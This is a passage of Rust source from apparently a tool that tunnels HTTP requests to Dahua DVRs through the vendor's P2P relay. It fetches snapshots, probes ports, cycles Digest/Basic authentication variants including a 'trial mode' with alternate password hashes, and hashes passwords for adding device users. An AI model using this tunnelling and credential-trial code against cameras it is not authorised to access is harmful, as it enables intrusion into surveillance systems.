    let body_stall = http_body_stall().max(timeout);

    loop {
        let now = tokio::time::Instant::now();
        // Before the headers land the deadline is absolute; afterwards it slides
        // with the payload stream so large responses (a 60 KB JPEG is dozens of
        // datagrams) are not cut short.
        let remaining = if have_headers {
            (last_activity + body_stall).saturating_duration_since(now)
        } else {
            deadline.saturating_duration_since(now)
        };
        if remaining.is_zero() {
            break;
        }

        let Some(raw) = udp_recv(sock, remaining).await else {
            break;
        };
        if raw.len() < 25 {
            continue;
        }
        let pkt = PTCPPacket::parse(&raw);
        let body_type = PTCPBody::parse(&raw[24..]);
        let pkt_realm = match &body_type {
            PTCPBody::Payload(p) => Some(p.realm),
            PTCPBody::Status(r, _) => Some(*r),
            _ => None,
        };
        {
            let mut s = pcp_session.lock().await;
            if pkt_realm == Some(realm_id) {
                s.recv(pkt);
            } else {
                s.recv_only_bytes(&pkt);
            }
        }

        match &body_type {
            PTCPBody::Payload(p) if p.realm == realm_id => {
                last_activity = tokio::time::Instant::now();
                {
                    let mut s = pcp_session.lock().await;
                    udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                }
                buf.extend_from_slice(&p.data);

                if std::env::var_os("DAHUA_TRUNC_DEBUG").is_some() {
                    let total_ms = timeout
                        .checked_sub(
                            deadline.saturating_duration_since(tokio::time::Instant::now()),
                        )
                        .unwrap_or_default()
                        .as_millis();
                    eprintln!(
                        "[trunc] realm={} +{}b → {}b total, t-{}ms",
                        realm_id,
                        p.data.len(),
                        buf.len(),
                        total_ms
                    );
                }

                if !have_headers {
                    let Some(pos) = find_bytes(&buf, b"\r\n\r\n") else {
                        continue;
                    };
                    have_headers = true;
                    body_offset = pos + 4;
                    headers = String::from_utf8_lossy(&buf[..pos]).into_owned();
                    chunked = headers
                        .to_ascii_lowercase()
                        .contains("transfer-encoding: chunked");
                }

                let body = &buf[body_offset.min(buf.len())..];
                match classify_http_body(&headers, body) {
                    HttpBodyEnd::Complete => break,
                    HttpBodyEnd::Drain => {
                        drain_realm_tail(sock, pcp_session, realm_id, &mut buf, 4).await;
                        break;
                    }
                    HttpBodyEnd::KeepReading => {}
                }
            }
            PTCPBody::Heartbeat => {
                let mut s = pcp_session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Heartbeat).serialize()).await;
                continue;
            }
            PTCPBody::Empty => {
                let mut s = pcp_session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                continue;
            }
            PTCPBody::Status(r, s) if *r == realm_id && s == "DISC" => {
                LAST_CALL_DISC.store(true, Ordering::Relaxed);
                break;
            }
            _ => continue,
        }
    }

    if buf.is_empty() {
        return None;
    }
    if !have_headers {
        return Some((String::new(), buf));
    }
    let start = body_offset.min(buf.len());
    let mut body = buf[start..].to_vec();
    if chunked {
        body = dechunk_http(&body);
    }
    Some((headers, body))
}

/// Basic-auth GET sent over an **already-open** PTCP realm (the live DHIP
/// challenge channel) instead of a fresh bind.
///
/// This is the pre-f744c3c snapshot transport. A number of DVRs accept a
/// single PTCP channel and only serve their web API on the channel that
/// currently carries the DHIP session: `7C03FF7PAZ93E44` answered 200 on the
/// challenge realm while every fresh bind drew silence. The Base64 auth rides
/// in the same datagram as the request, so no challenge/401 round-trip is
/// needed and the channel is never torn down.
pub async fn http_get_binary_on_realm(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    path: &str,
    timeout: Duration,
    user: &str,
    password: &str,
    cookie_session: &str,
) -> Option<(String, Vec<u8>)> {
    let auth = if user.is_empty() {
        String::new()
    } else {
        format!(
            "Authorization: Basic {}\r\n",
            base64_encode_basic(&format!("{}:{}", user, password))
        )
    };
    let cookie = if cookie_session.is_empty() {
        String::new()
    } else {
        format!(
            "Cookie: DhWebClientSessionID={}; WebClientSessionID={}\r\n",
            cookie_session, cookie_session
        )
    };
    let http_request = format!(
        "GET {path} HTTP/1.1\r\n\
         Accept-Encoding: identity\r\n\
         Connection: close\r\n\
         User-Agent: DahuaDhipAdduser\r\n\
         {auth}{cookie}\
         Host: {host}\r\n\
         \r\n"
    );
    http_exchange_on_realm(sock, pcp_session, realm_id, &http_request, timeout).await
}

/// `ptcp_bind` with a retry: it sends a single Bind datagram and gives up, and
/// relays drop it often enough that a one-shot bind reported live channels as
/// silent (`7C03FF7PAZ93E44` ch2 answered nothing while ch1 on the same port
/// returned 401). The P2P handshake already retries for the same reason.
pub async fn ptcp_bind_retry(
    sock: &UdpSocket,
    session: &Mutex<PTCPSession>,
    remote_port: u16,
    timeout_dur: Duration,
) -> Option<u32> {
    const ATTEMPTS: usize = 3;
    for attempt in 0..ATTEMPTS {
        if let Some(realm) = ptcp_bind(sock, session, remote_port, timeout_dur).await {
            return Some(realm);
        }
        if attempt + 1 < ATTEMPTS {
            // 1s, not less: the run that produced `Alive` on port 80 needed this
            // spacing, and 400ms still reported every port as BindFailed. The
            // relay needs a moment after the preceding SDK binds.
            tokio::time::sleep(Duration::from_secs(1)).await;
        }
    }
    None
}

/// One HTTP exchange on a **freshly bound** PTCP realm. Mirrors `doHTTP`
/// (tunnel.go:1226): every request gets its own bind, because the Dahua web
/// server tears the connection down on a 401 and a second request sent on the
/// same realm is never answered.
pub async fn http_exchange_once(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    bind_port: u16,
    http_request: &str,
    timeout: Duration,
) -> Option<(String, Vec<u8>)> {
    let realm = ptcp_bind_retry(sock, pcp_session, bind_port, timeout).await?;
    let resp = http_exchange_on_realm(sock, pcp_session, realm, http_request, timeout).await;
    ptcp_disconnect_quick(sock, pcp_session, realm).await;
    resp
}

/// Outcome of [`probe_bind_port`], kept granular because "the bind failed" and
/// "the device stayed silent" have very different fixes.
#[derive(Debug, PartialEq, Eq)]
pub enum PortProbe {
    /// The web server answered with an HTTP status line.
    Alive,
    /// The PTCP bind itself did not establish.
    BindFailed,
    /// The bind worked but no HTTP status line came back.
    NoHttpResponse,
}

/// Liveness probe of a single device bind port.
///
/// A PTCP bind on a port the device does not listen on yields silence, which
/// costs a full `timeout` every time. Paying that per (channel × path ×
/// credential strategy) is what made a 16-channel device take minutes to
/// discover it only answers on port 80. One probe per device is enough: any HTTP
/// status line counts as alive, including a 401, because that still proves the
/// web server is there.
pub async fn probe_bind_port(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    bind_port: u16,
    path: &str,
    host: &str,
    timeout: Duration,
) -> PortProbe {
    let request = format!(
        "GET {path} HTTP/1.1\r\n\
         Host: {host}\r\n\
         User-Agent: Mozilla/5.0\r\n\
         Accept: image/jpeg,image/*,*/*\r\n\
         Accept-Encoding: identity\r\n\
         Connection: close\r\n\
         \r\n"
    );
    // The bind is retried so one dropped datagram does not read as a dead port;
    // this only separates "the bind never established" from "the device stayed
    // silent", which need different fixes and must not be confused in the log.
    let Some(realm) = ptcp_bind_retry(sock, pcp_session, bind_port, timeout).await else {
        return PortProbe::BindFailed;
    };
    let resp = http_exchange_on_realm(sock, pcp_session, realm, &request, timeout).await;
    ptcp_disconnect_quick(sock, pcp_session, realm).await;
    match resp {
        Some((headers, _)) if headers.lines().any(|l| l.trim_start().starts_with("HTTP/")) => {
            PortProbe::Alive
        }
        _ => PortProbe::NoHttpResponse,
    }
}

/// GET over the PTCP tunnel with challenge-driven authentication.
///
/// Mirrors `DoHTTPAuth` / `DoHTTPAuthStrict` (tunnel.go:439/465): the first
/// request carries no `Authorization` header so the device hands out its
/// realm and nonce, then the answer is computed from *that* challenge and
/// retried. Every attempt uses a fresh realm.
pub async fn http_get_tunnel(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    bind_port: u16,
    host: &str,
    path: &str,
    timeout: Duration,
    user: &str,
    password: &str,
    cookie_session: &str,
) -> Option<(String, Vec<u8>)> {
    let cookie = if cookie_session.is_empty() {
        String::new()
    } else {
        format!(
            "Cookie: DhWebClientSessionID={}; WebClientSessionID={}\r\n",
            cookie_session, cookie_session
        )
    };
    let build = |auth: Option<&str>| -> String {
        let mut r = format!(
            "GET {path} HTTP/1.1\r\n\
             Host: {host}\r\n\
             User-Agent: Mozilla/5.0\r\n\
             Accept: image/jpeg,image/webp,image/*,*/*\r\n\
             Accept-Encoding: identity\r\n\
             Connection: close\r\n"
        );
        if let Some(a) = auth {
            r.push_str(a);
            r.push_str("\r\n");
        }
        r.push_str(&cookie);
        r.push_str("\r\n");
        r
    };

    let probe = http_exchange_once(sock, pcp_session, bind_port, &build(None), timeout).await?;
    if user.is_empty() || !probe.0.to_lowercase().contains("401 unauthorized") {
        return Some(probe);
    }

    // Candidate answers, ordered by scheme preference (Digest first) and, for
    // Digest, by the HA1-case / digest-URI combination each firmware expects.
    let mut candidates: Vec<String> = Vec::new();
    for ch in parse_www_authenticate(&probe.0) {
        match ch.scheme.as_str() {
            "digest" => {
                for variant in 0..4 {
                    if let Some(a) = build_digest_header("GET", path, user, password, &ch, variant)
                    {
                        candidates.push(a);
                    }
                }
            }
            "basic" => candidates.push(format!(
                "Authorization: Basic {}",
                base64_encode_basic(&format!("{}:{}", user, password))
            )),
            "wsse" => candidates.push(build_wsse_header(user, password)),
            _ => {}
        }
    }

    // Trial mode (env DAHUA_DIGEST_TRIAL=1): after the standard candidates may
    // all fail, probe alternate HA1 inputs. Some firmware hashes a *different*
    // realm than the one it advertises, or treats MD5(plaintext) as the digest
    // password. Each trial costs one more bind, so this runs only when enabled
    // and sticks to variant 0 (lowercase HA1, full digest URI).
    if std::env::var_os("DAHUA_DIGEST_TRIAL").is_some() {
        if let Some(ch) = parse_www_authenticate(&probe.0)
            .into_iter()
            .find(|c| c.scheme == "digest")
        {
            let bare = ch
                .realm
                .strip_prefix("Login to ")
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .map(str::to_string);
            let mut trial_realms: Vec<String> = Vec::new();
            if let Some(b) = &bare {
                trial_realms.push(b.clone());
            }
            trial_realms.push("Login to Dahua".to_string());
            trial_realms.push("Dahua".to_string());
            if let Some(sr) = std::env::var("DAHUA_TRIAL_SERIAL").ok() {
                trial_realms.push(format!("Login to {}", sr));
                trial_realms.push(sr);
            }
            let pl = password.to_string();
            let ml = md5_hex_lower(password);
            let mu = md5_hex_upper(password);
            // (realm, password) pairs for HA1; advertised realm keeps its plain
            // form too but that one is already covered by the standard variants.
            let mut combos: Vec<(String, &str)> = trial_realms
                .iter()
                .map(|r| (r.clone(), pl.as_str()))
                .collect();
            combos.push((ch.realm.clone(), ml.as_str()));
            combos.push((ch.realm.clone(), mu.as_str()));
            if let Some(b) = &bare {
                combos.push((b.clone(), ml.as_str()));
                combos.push((b.clone(), mu.as_str()));
            }
            let mut seen = std::collections::HashSet::new();
            for (realm, pass) in combos {
                let mut rc = ch.clone();
                rc.realm = realm;
                if let Some(a) = build_digest_header("GET", path, user, pass, &rc, 0) {
                    if seen.insert(a.clone()) {
                        if HTTP_DEBUG.load(Ordering::Relaxed) {
                            eprintln!("  [digest-trial] realm={:?} → {}", rc.realm, a);
                        }
                        candidates.push(a);
                    }
                }
            }
        }
    }

    let mut last = probe;
    for auth in &candidates {
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!("  [digest] > {}", auth);
        }
        let Some(resp) =
            http_exchange_once(sock, pcp_session, bind_port, &build(Some(auth)), timeout).await
        else {
            continue;
        };
        let status = resp
            .0
            .lines()
            .find(|l| l.starts_with("HTTP/"))
            .unwrap_or("HTTP (none)")
            .trim()
            .to_string();
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!("  [digest] < {} ({} bytes)", status, resp.1.len());
        }
        if !resp.0.to_lowercase().contains("401 unauthorized") {
            return Some(resp);
        }
        last = resp;
    }
    Some(last)
}

/// Send an HTTP request through PTCP tunnel and receive response.
/// `session` (when non-empty) is echoed back as the DhWebClientSessionID/WebClientSessionID
/// cookies, matching what Dahua's own apps send on /RPC2 calls.
pub async fn http_call(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    path: &str,
    body: &str,
    timeout: Duration,
    session: &str,
) -> Option<String> {
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!("[debug] http_call -> {} ({}-byte body)", path, body.len());
    }
    LAST_CALL_DISC.store(false, Ordering::Relaxed);
    let cookie = if session.is_empty() {
        String::new()
    } else {
        format!(
            "Cookie: DhWebClientSessionID={}; WebClientSessionID={}\r\n",
            session, session
        )
    };

    let http_request = format!(
        "POST {path} HTTP/1.1\r\n\
         Accept-Encoding: identity\r\n\
         Content-Type: application/json\r\n\
         Connection: keep-alive\r\n\
         User-Agent: DahuaDhipAdduser\r\n\
         {}Host: {host}\r\n\
         Content-Length: {}\r\n\
         \r\n\
         {}",
        cookie,
        body.len(),
        body
    );

    {
        let mut ps = pcp_session.lock().await;
        udp_send(
            sock,
            &ps.send(PTCPBody::Payload(PTCPPayload {
                realm: realm_id,
                data: http_request.as_bytes().to_vec(),
            }))
            .serialize(),
        )
        .await;
    }

    let deadline = tokio::time::Instant::now() + timeout;
    let mut buf = Vec::new();
    let mut pkt_count = 0u32;
    let mut last_activity = tokio::time::Instant::now();
    let mut have_headers = false;
    let mut content_len: Option<usize> = None;
    let mut body_offset = 0usize;

    loop {
        let now = tokio::time::Instant::now();
        // Once headers are known, extend while payload packets keep arriving
        // (large responses stream slowly through the relay, e.g. ~36 packets
        // for a 46 KB user list). Idle calls still time out after `timeout`.
        let remaining = if have_headers {
            (last_activity + timeout).saturating_duration_since(now)
        } else {
            deadline.saturating_duration_since(now)
        };
        if remaining.is_zero() {
            break;
        }

        let raw = match udp_recv(sock, remaining).await {
            Some(raw) => raw,
            None => break,
        };
        if raw.len() < 25 {
            continue;
        }
        pkt_count += 1;
        let pkt = PTCPPacket::parse(&raw);
        let body_type = PTCPBody::parse(&raw[24..]);

        if HTTP_DEBUG.load(Ordering::Relaxed) {
            let preview: Vec<u8> = raw.iter().take(64).cloned().collect();
            eprintln!(
                "[debug] http_call <- packet #{}: {} bytes, body: {:?}, first: {:?}",
                pkt_count,
                raw.len(),
                body_type,
                String::from_utf8_lossy(&preview)
            );
        }

        let pkt_realm = match &body_type {
            PTCPBody::Payload(p) => Some(p.realm),
            PTCPBody::Status(r, _) => Some(*r),
            _ => None,
        };

        {
            let mut s = pcp_session.lock().await;
            if pkt_realm == Some(realm_id) {
                s.recv(pkt);
            } else {
                s.recv_only_bytes(&pkt);
            }
        }

        match &body_type {
            PTCPBody::Payload(p) if p.realm == realm_id => {
                last_activity = tokio::time::Instant::now();
                {
                    // ACK the data so the relay keeps streaming the response
                    let mut s = pcp_session.lock().await;
                    udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                }
                buf.extend_from_slice(&p.data);
                let data_str = String::from_utf8_lossy(&buf);

                if let Some(pos) = data_str.find("\r\n\r\n") {
                    if !have_headers {
                        have_headers = true;
                        body_offset = pos + 4;
                        let headers = &data_str[..pos];
                        content_len = headers
                            .lines()
                            .find(|l| l.to_lowercase().starts_with("content-length:"))
                            .and_then(|l| l.split(':').nth(1))
                            .and_then(|s| s.trim().parse::<usize>().ok());
                    }

                    match content_len {
                        Some(len) if buf.len() >= body_offset + len => {
                            return Some(data_str.to_string());
                        }
                        None => {
                            return Some(data_str.to_string());
                        }
                        _ => {}
                    }
                }
            }
            PTCPBody::Heartbeat => {
                let mut s = pcp_session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Heartbeat).serialize()).await;
                continue;
            }
            PTCPBody::Empty => {
                let mut s = pcp_session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                continue;
            }
            PTCPBody::Status(r, s) if *r == realm_id && s == "DISC" => {
                if HTTP_DEBUG.load(Ordering::Relaxed) {
                    eprintln!("[debug] http_call: DISC received — device disconnected channel");
                }
                LAST_CALL_DISC.store(true, Ordering::Relaxed);
                break;
            }
            _ => continue,
        }
    }

    if buf.is_empty() {
        None
    } else {
        Some(String::from_utf8_lossy(&buf).to_string())
    }
}

fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || needle.len() > haystack.len() {
        return None;
    }
    haystack.windows(needle.len()).position(|w| w == needle)
}

pub fn base64_encode_basic(input: &str) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(input.as_bytes())
}

pub fn http_extract_body(http_response: &str) -> Option<&str> {
    if let Some(pos) = http_response.find("\r\n\r\n") {
        Some(&http_response[pos + 4..])
    } else if let Some(pos) = http_response.find("\n\n") {
        Some(&http_response[pos + 2..])
    } else {
        None
    }
}

/// Compute password hash for addUser (HA1 format).
/// Format: MD5(username:realm:password) — uppercase hex to match Smart Manager.
/// The device stores this as-is and verifies DHIP login as MD5(user:random:stored).
pub fn http_adduser_password_hash(user: &str, realm: &str, password: &str) -> String {
    format!(
        "{:X}",
        md5::compute(format!("{}:{}:{}", user, realm, password).as_bytes())
    )
}

/// Fetch a URL via direct TCP (no PTCP tunnel). Returns (headers, body) or None on failure.
pub async fn http_get_direct(
    host: &str,
    port: u16,
    path: &str,
    user: &str,
    password: &str,
    timeout: Duration,
) -> Option<(String, Vec<u8>)> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let addr = format!("{}:{}", host, port);
    let mut stream =
        match tokio::time::timeout(timeout, tokio::net::TcpStream::connect(&addr)).await {
            Ok(Ok(s)) => s,
            _ => return None,
        };
    let auth = if user.is_empty() {
        String::new()
    } else {
        format!(
            "Authorization: Basic {}\r\n",
            base64_encode_basic(&format!("{}:{}", user, password))
        )
    };
    let req = format!(
        "GET {path} HTTP/1.1\r\n\
         Host: {host}:{port}\r\n\
         {auth}\
         Accept: image/jpeg\r\n\
         Connection: close\r\n\
         User-Agent: DahuaDhipAdduser\r\n\
         \r\n"
    );
    if stream.write_all(req.as_bytes()).await.is_err() {
        return None;
    }
    let mut buf = Vec::new();
    let _ = tokio::time::timeout(timeout, async {
        loop {
            let mut chunk = [0u8; 4096];
            match stream.read(&mut chunk).await {
                Ok(0) | Err(_) => break,
                Ok(n) => buf.extend_from_slice(&chunk[..n]),
            }
        }
    })
    .await;
    if buf.is_empty() {
        return None;
    }
    // Split headers / body on \r\n\r\n.
    if let Some(pos) = find_bytes(&buf, b"\r\n\r\n") {
        let headers = String::from_utf8_lossy(&buf[..pos]).into_owned();
        Some((headers, buf[pos + 4..].to_vec()))
    } else {
        Some((String::new(), buf))
    }
}
